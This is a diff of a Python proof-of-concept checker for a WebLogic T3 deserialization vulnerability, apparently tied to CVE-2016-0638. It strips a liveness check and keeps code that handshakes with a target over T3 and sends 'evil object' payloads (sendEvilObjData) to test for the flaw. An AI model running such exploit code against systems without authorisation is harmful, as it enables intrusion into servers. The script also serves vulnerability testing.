@@ -79,31 +79,27 @@ def checkVul(res, server_addr):
     #     return 'CVE-2016-0638'
 
 
-def islive(ip):
-    r = requests.get(ip, headers=heads, allow_redirects=False, timeout=10, verify=False)
-    return r.status_code
-
 
 def poc(ip):
     try:
-        if islive(ip) == 200:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
-            # socket.setdefaulttimeout(10)
-            sock.settimeout(15)
-            if '://' in str(ip):
-                ip = ip.split('//')[1]
-            rip = ip.split(':')[0]
-            rport = int(ip.split(':')[1])
-            server_addr = (str(rip), rport)
-            try:
-                t3handshake(sock, server_addr)
-                buildT3RequestObject(sock, rport)
-                for index in PAYLOAD:
-                    rs = sendEvilObjData(sock, index)
-                    return checkVul(rs, ip)
-            except:
-                pass
+
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
+        # socket.setdefaulttimeout(10)
+        sock.settimeout(15)
+        if '://' in str(ip):
+            ip = ip.split('//')[1]
+        rip = ip.split(':')[0]
+        rport = int(ip.split(':')[1])
+        server_addr = (str(rip), rport)
+        try:
+            t3handshake(sock, server_addr)
+            buildT3RequestObject(sock, rport)
+            for index in PAYLOAD:
+                rs = sendEvilObjData(sock, index)
+                return checkVul(rs, ip)
+        except:
+            pass
     except:
         pass
 
